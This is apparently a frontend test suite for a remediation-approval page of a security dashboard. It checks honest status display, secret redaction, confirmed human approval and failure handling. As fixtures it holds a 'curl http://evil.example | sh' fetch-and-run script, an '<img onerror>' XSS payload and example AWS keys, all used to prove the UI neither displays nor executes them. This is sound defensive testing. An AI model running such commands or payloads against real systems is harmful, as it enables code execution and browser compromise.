import { act, fireEvent, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';
import { PREVIEW_ASSETS, PREVIEW_FINDINGS, PREVIEW_REMEDIATIONS } from '@/mocks/fixtures';
import type { RemediationAction } from '@/types';
import { HEALTHY, json, renderApp, stubFetch, stubOffline } from '@/test/utils';

const make = (patch: Partial<RemediationAction> = {}): RemediationAction => ({ ...PREVIEW_REMEDIATIONS[0], id: 'rem-x', ...patch });
const isPost = (init?: RequestInit) => init?.method === 'POST';
const posts = (m: ReturnType<typeof stubFetch>) => m.mock.calls.filter(([, init]) => isPost(init as RequestInit | undefined));

type Handler = { remediations?: unknown; approve?: (body: unknown) => Response | Promise<Response> };
function serve({ remediations = [make()], approve }: Handler = {}) {
  return stubFetch((url, init) => {
    if (isPost(init)) return approve ? approve(JSON.parse(String(init?.body))) : json({}, 501);
    if (url.endsWith('/health')) return json(HEALTHY);
    if (url.includes('/remediations')) return json(remediations);
    if (url.endsWith('/assets')) return json(PREVIEW_ASSETS);
    if (url.includes('/findings')) return json(PREVIEW_FINDINGS);
    return json([]);
  });
}

async function fillAndReview(user: ReturnType<typeof userEvent.setup>, label = /Review and approve/) {
  await user.type(await screen.findByLabelText('Approver'), 'dev-b');
  await user.type(screen.getByLabelText(/Rationale/), 'scoped, reviewed');
  await user.click(screen.getByLabelText(/I have reviewed the proposed patch/));
  await user.click(screen.getByRole('button', { name: label }));
  return screen.findByRole('alertdialog');
}
const confirm = (user: ReturnType<typeof userEvent.setup>, dialog: HTMLElement) => user.click(within(dialog).getByRole('button', { name: 'Approve remediation' }));

describe('TSK-021: green appears ONLY for backend APPLIED + PASSED', () => {
  const CASES: { name: string; patch: Partial<RemediationAction>; green: boolean }[] = [
    { name: 'PENDING / UNVERIFIED', patch: { status: 'PENDING', verificationStatus: 'UNVERIFIED' }, green: false },
    { name: 'PENDING / PASSED (inconsistent)', patch: { status: 'PENDING', verificationStatus: 'PASSED' }, green: false },
    { name: 'APPROVED / PASSED (inconsistent)', patch: { status: 'APPROVED', verificationStatus: 'PASSED' }, green: false },
    { name: 'APPLIED / UNVERIFIED', patch: { status: 'APPLIED', verificationStatus: 'UNVERIFIED' }, green: false },
    { name: 'APPLIED / no verification field', patch: { status: 'APPLIED', verificationStatus: undefined }, green: false },
    { name: 'APPLIED / FAILED', patch: { status: 'APPLIED', verificationStatus: 'FAILED' }, green: false },
    { name: 'FAILED / PASSED (inconsistent)', patch: { status: 'FAILED', verificationStatus: 'PASSED' }, green: false },
    { name: 'REJECTED / PASSED (inconsistent)', patch: { status: 'REJECTED', verificationStatus: 'PASSED' }, green: false },
    { name: 'APPLIED / PASSED', patch: { status: 'APPLIED', verificationStatus: 'PASSED' }, green: true },
  ];

  it.each(CASES)('$name -> green=$green', async ({ patch, green }) => {
    serve({ remediations: [make(patch)] });
    renderApp('/remediation', 'api');
    await screen.findByRole('heading', { name: PREVIEW_REMEDIATIONS[0].title });
    expect(!!screen.queryByTestId('verification-success')).toBe(green);
    // nothing else on the page may be green either: no stage, badge or diff line (a green "Applied" check or a green
    // "+" line would read as success the backend has not established)
    // (scoped to <main>: the command bar's backend-online dot is green for a real healthy /health, a different fact)
    const greenElements = [...screen.getByRole('main').querySelectorAll('[class]')].filter((e) => /(^|\s)(text|bg|border)-ok(\/\d+)?(\s|$)/.test(e.getAttribute('class') ?? ''));
    expect(greenElements.length > 0).toBe(green);
    if (green) {
      // when verified, green is limited to: the verification panel, the Verified stage, and the "Verified" state badges
      const allowed = (e: Element) =>
        !!e.closest('[data-testid="verification-success"]') ||
        e.closest('[data-stage]')?.getAttribute('data-stage') === 'verified' ||
        e.textContent?.trim() === 'Verified';
      const stray = greenElements.filter((e) => !allowed(e)).map((e) => `${e.tagName}:${(e.textContent ?? '').slice(0, 30)}:${e.getAttribute('class')}`);
      expect(stray).toEqual([]);
    } else {
      expect(screen.getByRole('main').textContent).not.toMatch(/Verified remediated/);
    }
  });

  it('shows the raw backend state beside the derived stage, so nothing is hidden', async () => {
    serve({ remediations: [make({ status: 'APPLIED', verificationStatus: 'FAILED' })] });
    renderApp('/remediation', 'api');
    expect(await screen.findByTestId('backend-state')).toHaveTextContent('APPLIED / FAILED');
  });

  it('does not claim re-assessment evidence the contract has no field for', async () => {
    serve({ remediations: [make({ status: 'APPLIED', verificationStatus: 'PASSED' })] });
    renderApp('/remediation', 'api');
    const panel = (await screen.findByTestId('verification-success')).closest('section') as HTMLElement;
    expect(panel).toHaveTextContent(/Re-assessment evidence\s*Not provided by the backend contract/);
    expect(panel).not.toHaveTextContent(/reassessment id|scanner result|comparison/i);
  });
});

describe('TSK-021: proposal details come from the backend proposal', () => {
  it('shows scope (files), change size and human-review requirement derived from the patch', async () => {
    serve({ remediations: [make()] });
    renderApp('/remediation', 'api');
    expect(await screen.findByTestId('scope')).toHaveTextContent('config/staging.env');
    expect(screen.getByText('+1 / −1 lines')).toBeInTheDocument();
    expect(screen.getByText('Required before any change')).toBeInTheDocument();
  });

  it('flags placeholders a human must complete and says the patch is not applicable as written', async () => {
    serve({ remediations: [{ ...PREVIEW_REMEDIATIONS[1], id: 'rem-iac' }] });
    renderApp('/remediation', 'api');
    const note = await screen.findByTestId('placeholders');
    expect(note).toHaveTextContent('<scoped-staging-bucket>');
    expect(note).toHaveTextContent(/not applicable as written/);
  });

  it('shows no placeholder warning for a complete patch', async () => {
    serve({ remediations: [make()] });
    renderApp('/remediation', 'api');
    await screen.findByTestId('scope');
    expect(screen.queryByTestId('placeholders')).not.toBeInTheDocument();
  });

  it('says so when the backend sent no patch, and offers nothing to approve a patch that does not exist visibly', async () => {
    serve({ remediations: [make({ patchDiff: undefined })] });
    renderApp('/remediation', 'api');
    expect(await screen.findByText('No patch supplied')).toBeInTheDocument();
    expect(screen.getByTestId('scope')).toHaveTextContent('No file paths in the patch');
  });

  it('never displays or runs a supplied shell script', async () => {
    serve({ remediations: [make({ shellScript: 'curl http://evil.example | sh' })] });
    renderApp('/remediation', 'api');
    await screen.findByTestId('scope');
    expect(document.body).not.toHaveTextContent('evil.example');
    expect(screen.getByText(/also supplied a shell script\. It is not displayed or run here/)).toBeInTheDocument();
  });
});

describe('TSK-021: secrets never reach the screen or the clipboard', () => {
  const leaky = make({
    patchDiff: ['--- a/config/staging.env', '+++ b/config/staging.env', '@@ -1 +1 @@', '-AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', '-AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE', '+AWS_SECRET_ACCESS_KEY=${SECRET_VAULT_AWS_KEY}'].join('\n'),
  });

  it('hides a raw credential in a diff and says it did', async () => {
    serve({ remediations: [leaky] });
    renderApp('/remediation', 'api');
    expect(await screen.findByTestId('diff-redacted')).toHaveTextContent(/hidden before display and will not be copied/);
    expect(document.body.textContent).not.toContain('wJalrXUtnFEMI');
    expect(document.body.textContent).not.toContain('IOSFODNN7EXAMPLE');
    expect(document.body.textContent).toContain('${SECRET_VAULT_AWS_KEY}'); // the safe reference is kept
  });

  it('copies the REDACTED patch, never the original', async () => {
    let copied = '';
    serve({ remediations: [leaky] });
    const user = userEvent.setup();
    // after setup(): user-event installs its own clipboard stub there, which would replace an earlier override
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t: string) => { copied = t; } } });
    renderApp('/remediation', 'api');
    await user.click(await screen.findByRole('button', { name: 'Copy patch' }));
    await waitFor(() => expect(copied).not.toBe(''));
    expect(copied).not.toContain('wJalrXUtnFEMI');
    expect(copied).not.toContain('IOSFODNN7EXAMPLE');
    expect(copied).toContain('${SECRET_VAULT_AWS_KEY}');
  });

  it('shows no redaction notice for an already-masked fixture patch', async () => {
    serve({ remediations: [make()] });
    renderApp('/remediation', 'api');
    await screen.findByTestId('scope');
    expect(screen.queryByTestId('diff-redacted')).not.toBeInTheDocument();
    expect(document.body.textContent).toContain('wJal****************EKEY');
  });

  it('reports a failed copy honestly', async () => {
    serve();
    const user = userEvent.setup();
    Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async () => { throw new Error('denied'); } } });
    renderApp('/remediation', 'api');
    await user.click(await screen.findByRole('button', { name: 'Copy patch' }));
    expect(await screen.findByRole('button', { name: 'Copy failed' })).toBeInTheDocument();
  });
});

describe('TSK-021: approval is a deliberate, confirmed, backend-recorded act', () => {
  it('opening the form, the diff or the dialog sends nothing; Review stays disabled until approver and checkbox', async () => {
    const m = serve();
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    const review = await screen.findByRole('button', { name: /Review and approve/ });
    expect(review).toBeDisabled();
    await user.type(screen.getByLabelText('Approver'), 'dev-b');
    expect(review).toBeDisabled(); // checkbox still unchecked
    await user.click(screen.getByLabelText(/I have reviewed the proposed patch/));
    expect(review).toBeEnabled();
    await user.click(review);
    await screen.findByRole('alertdialog');
    expect(posts(m)).toHaveLength(0);
  });

  it('a whitespace-only approver is not enough', async () => {
    serve();
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    await user.type(await screen.findByLabelText('Approver'), '   ');
    await user.click(screen.getByLabelText(/I have reviewed the proposed patch/));
    expect(screen.getByRole('button', { name: /Review and approve/ })).toBeDisabled();
  });

  it('the dialog states exactly what is being approved: title, files, size, approver, and what approval does NOT prove', async () => {
    serve();
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    const dialog = await fillAndReview(user);
    expect(dialog).toHaveTextContent(PREVIEW_REMEDIATIONS[0].title);
    expect(dialog).toHaveTextContent('config/staging.env');
    expect(dialog).toHaveTextContent('+1 / −1 lines');
    expect(dialog).toHaveTextContent('dev-b');
    expect(dialog).toHaveTextContent(/does not prove the change was applied/i);
  });

  it('Cancel leaves everything untouched and sends nothing; Cancel is the initial focus', async () => {
    const m = serve();
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    const dialog = await fillAndReview(user);
    expect(within(dialog).getByRole('button', { name: 'Cancel' })).toHaveFocus();
    await user.click(within(dialog).getByRole('button', { name: 'Cancel' }));
    expect(screen.queryByRole('alertdialog')).not.toBeInTheDocument();
    expect(posts(m)).toHaveLength(0);
    expect(screen.getAllByText('Awaiting approval').length).toBeGreaterThan(0);
  });

  it('confirming sends exactly one POST with the approver and rationale, and shows ONLY the backend-returned state', async () => {
    let received: unknown;
    const m = serve({ approve: (body) => { received = body; return json(make({ status: 'APPROVED', verificationStatus: 'UNVERIFIED' })); } });
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    await confirm(user, await fillAndReview(user));
    expect(await screen.findByTestId('approval-recorded')).toHaveTextContent(/APPROVED \/ UNVERIFIED/);
    expect(posts(m)).toHaveLength(1);
    expect(String(posts(m)[0][0])).toBe('http://localhost:8000/api/v1/remediations/rem-x/approve');
    expect(received).toEqual({ approvedBy: 'dev-b', comments: 'scoped, reviewed' });
    // recorded approval is NOT applied and NOT verified
    expect(screen.queryByTestId('verification-success')).not.toBeInTheDocument();
    expect(screen.getByTestId('verification-pending')).toBeInTheDocument();
    expect(screen.getByTestId('approval-recorded')).toHaveTextContent(/not proof the change was applied/);
    expect(screen.getAllByText('Approved, not applied').length).toBeGreaterThan(0);
  });

  it('a 2xx reply that still says PENDING is NOT shown as an approval', async () => {
    serve({ approve: () => json(make({ status: 'PENDING' })) });
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    await confirm(user, await fillAndReview(user));
    expect(await screen.findByTestId('approval-not-recorded')).toHaveTextContent(/No approval was recorded/);
    expect(screen.getAllByText('Awaiting approval').length).toBeGreaterThan(0);
    expect(screen.queryByTestId('approval-recorded')).not.toBeInTheDocument();
  });

  it('a 2xx reply about a DIFFERENT remediation is rejected, nothing is shown as approved', async () => {
    serve({ approve: () => json(make({ id: 'rem-other', status: 'APPROVED' })) });
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    await confirm(user, await fillAndReview(user));
    expect(await screen.findByRole('alert')).toHaveTextContent(/different remediation/);
    expect(screen.queryByTestId('approval-recorded')).not.toBeInTheDocument();
    expect(screen.getAllByText('Awaiting approval').length).toBeGreaterThan(0);
  });

  it('a 2xx reply with an unknown status is rejected as untrustworthy', async () => {
    serve({ approve: () => json({ ...make(), status: 'ALL_DONE' }) });
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    await confirm(user, await fillAndReview(user));
    expect(await screen.findByRole('alert')).toHaveTextContent(/unrecognised shape/);
    expect(screen.queryByTestId('approval-recorded')).not.toBeInTheDocument();
  });

  it.each<[string, number, RegExp]>([
    ['not implemented (the real backend today)', 501, /does not support approvals yet\. Nothing was approved/],
    ['not found', 404, /does not support approvals yet|no longer has this remediation/],
    ['stale version', 409, /changed on the backend after it was loaded/],
    ['validation error', 422, /rejected the approval details/],
    ['server error', 500, /did not accept the approval\. Nothing was changed/],
  ])('%s (HTTP %i) shows an honest failure and approves nothing', async (_n, status, message) => {
    serve({ approve: () => json({ detail: 'Traceback: sk-live-SECRET-9999' }, status) });
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    await confirm(user, await fillAndReview(user));
    expect(await screen.findByRole('alert')).toHaveTextContent(message);
    expect(screen.queryByTestId('approval-recorded')).not.toBeInTheDocument();
    expect(screen.getAllByText('Awaiting approval').length).toBeGreaterThan(0);
    expect(document.body).not.toHaveTextContent('SECRET-9999'); // server bodies are never rendered
    expect(document.body).not.toHaveTextContent('Traceback');
  });

  it('an unreachable backend says nothing was approved', async () => {
    stubFetch((url, init) => {
      if (isPost(init)) throw new TypeError('Failed to fetch');
      if (url.endsWith('/health')) return json(HEALTHY);
      if (url.includes('/remediations')) return json([make()]);
      return json([]);
    });
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    await confirm(user, await fillAndReview(user));
    expect(await screen.findByRole('alert')).toHaveTextContent(/unreachable\. Nothing was approved or changed/);
  });

  it('blocks a duplicate submission: double-clicking Confirm sends ONE request', async () => {
    let release: (r: Response) => void = () => {};
    const m = serve({ approve: () => new Promise<Response>((res) => (release = res)) });
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    const dialog = await fillAndReview(user);
    const button = within(dialog).getByRole('button', { name: 'Approve remediation' });
    await user.dblClick(button);
    await waitFor(() => expect(within(screen.getByRole('alertdialog')).getByRole('button', { name: /Sending approval/ })).toBeDisabled());
    await user.keyboard('{Escape}'); // an in-flight approval cannot be dismissed
    expect(screen.getByRole('alertdialog')).toBeInTheDocument();
    release(json(make({ status: 'APPROVED' })));
    await waitFor(() => expect(screen.queryByRole('alertdialog')).not.toBeInTheDocument());
    expect(posts(m)).toHaveLength(1);
  });

  it('two confirm clicks in the SAME tick still send one request (the ref guard, not just the disabled button)', async () => {
    let release: (r: Response) => void = () => {};
    const m = serve({ approve: () => new Promise<Response>((res) => (release = res)) });
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    const dialog = await fillAndReview(user);
    const button = within(dialog).getByRole('button', { name: 'Approve remediation' });
    // Both clicks are dispatched inside one act(): React has not re-rendered the button as disabled between them, so
    // only a synchronous guard can stop the second one.
    await act(async () => {
      fireEvent.click(button);
      fireEvent.click(button);
    });
    expect(posts(m)).toHaveLength(1);
    release(json(make({ status: 'APPROVED' })));
    await waitFor(() => expect(screen.queryByRole('alertdialog')).not.toBeInTheDocument());
    expect(posts(m)).toHaveLength(1);
  });

  it('an already-approved remediation offers no second approval', async () => {
    serve({ remediations: [make({ status: 'APPROVED' })] });
    renderApp('/remediation', 'api');
    await screen.findByTestId('scope');
    expect(screen.queryByRole('form', { name: 'Human approval' })).not.toBeInTheDocument();
    expect(screen.getByText(/approval decision is already recorded/)).toBeInTheDocument();
  });

  it('a rejected remediation says no approval is possible', async () => {
    serve({ remediations: [make({ status: 'REJECTED' })] });
    renderApp('/remediation', 'api');
    expect(await screen.findByText(/was rejected\. No approval is possible/)).toBeInTheDocument();
  });
});

describe('TSK-021: Reject and Execute are honestly unavailable', () => {
  it('Reject is disabled and explains the contract has no reject operation; clicking cannot change anything', async () => {
    const m = serve();
    const user = userEvent.setup();
    renderApp('/remediation', 'api');
    const reject = await screen.findByRole('button', { name: 'Reject' });
    expect(reject).toBeDisabled();
    expect(reject).toHaveAccessibleDescription(/no reject operation/);
    await user.click(reject);
    expect(posts(m)).toHaveLength(0);
  });

  it('there is no Execute / Apply / Run control, because no execute endpoint exists', async () => {
    serve();
    renderApp('/remediation', 'api');
    expect(await screen.findByTestId('execution-unavailable')).toHaveTextContent(/defines no execute operation yet, so there is no Execute button/);
    expect(screen.queryByRole('button', { name: /execute|apply|run|deploy/i })).not.toBeInTheDocument();
  });

  it('the lifecycle shows Applied only when the backend reports it', async () => {
    serve({ remediations: [make({ status: 'APPROVED' })] });
    renderApp('/remediation', 'api');
    await screen.findByTestId('scope');
    const stages = document.querySelectorAll('[data-stage]');
    const applied = [...stages].find((s) => s.getAttribute('data-stage') === 'applied')!;
    expect(applied.getAttribute('data-state')).not.toBe('done');
  });
});

describe('TSK-021: preview mode', () => {
  it('review then confirm sends no request at all and changes no state', async () => {
    const m = stubOffline();
    const user = userEvent.setup();
    renderApp('/remediation');
    const dialog = await fillAndReview(user, /Review \(preview\)/);
    expect(dialog).toHaveTextContent(/No request will be sent and nothing will change/);
    await user.click(within(dialog).getByRole('button', { name: 'Got it' }));
    expect(await screen.findByTestId('approval-preview-notice')).toBeInTheDocument();
    expect(posts(m)).toHaveLength(0);
    expect(screen.queryByTestId('verification-success')).not.toBeInTheDocument();
  });

  it('labels the patch as illustrative and keeps secrets masked', async () => {
    stubOffline();
    renderApp('/remediation');
    expect(await screen.findByText(/Illustrative diff for the synthetic scenario/)).toBeInTheDocument();
    expect(document.body.textContent).not.toContain('wJalrXUtnFEMI');
  });
});

describe('TSK-021: deep link by remediation id', () => {
  it('opens ?r=<id> directly, and selecting another replaces the param', async () => {
    stubOffline();
    const user = userEvent.setup();
    renderApp('/remediation?r=rem-02');
    expect(await screen.findByRole('heading', { name: PREVIEW_REMEDIATIONS[1].title })).toBeInTheDocument();
    expect(screen.getByRole('option', { name: /Scope the IAM policy/ })).toHaveAttribute('aria-selected', 'true');
    await user.click(within(screen.getByRole('listbox', { name: 'Remediations' })).getByRole('button', { name: /Remove the committed secret/ }));
    expect(await screen.findByRole('heading', { name: PREVIEW_REMEDIATIONS[0].title })).toBeInTheDocument();
  });

  it('says plainly when the id is not in this data source, and shows the first remediation instead', async () => {
    stubOffline();
    renderApp('/remediation?r=rem-nope');
    expect(await screen.findByTestId('remediation-not-found')).toHaveTextContent(/No remediation rem-nope exists in the current data source/);
    expect(screen.getByRole('heading', { name: PREVIEW_REMEDIATIONS[0].title })).toBeInTheDocument();
  });

  it('renders hostile ids as text, never as markup', async () => {
    stubOffline();
    renderApp(`/remediation?r=${encodeURIComponent('<img src=x onerror=alert(1)>')}`);
    await screen.findByTestId('remediation-not-found');
    expect(document.querySelector('img[src="x"]')).toBeNull();
  });

  it('the "View finding" link deep-links to that exact finding', async () => {
    stubOffline();
    renderApp('/remediation');
    expect(await screen.findByRole('link', { name: 'View finding' })).toHaveAttribute('href', '/threats?f=find-sec-01');
  });
});

describe('TSK-021: states', () => {
  it('API mode never silently shows fixtures when the backend is down', async () => {
    stubOffline();
    renderApp('/remediation', 'api');
    expect(await screen.findByRole('alert')).toHaveTextContent('Backend unreachable');
    expect(screen.queryByTestId('scope')).not.toBeInTheDocument();
  });

  it('an empty backend shows an honest empty state (the real backend today)', async () => {
    serve({ remediations: [] });
    renderApp('/remediation', 'api');
    expect(await screen.findByText('No remediations proposed')).toBeInTheDocument();
  });

  it('the queue shows each remediation with its truthful state badge', async () => {
    serve({ remediations: [make({ id: 'a', status: 'PENDING', title: 'A' }), make({ id: 'b', status: 'APPLIED', verificationStatus: 'PASSED', title: 'B' }), make({ id: 'c', status: 'FAILED', title: 'C' })] });
    renderApp('/remediation', 'api');
    const queue = await screen.findByRole('listbox', { name: 'Remediations' });
    expect(within(queue).getAllByRole('option')).toHaveLength(3);
    expect(within(queue).getByText('Awaiting approval')).toBeInTheDocument();
    expect(within(queue).getByText('Verified')).toBeInTheDocument();
    expect(within(queue).getByText('Failed')).toBeInTheDocument();
  });
});
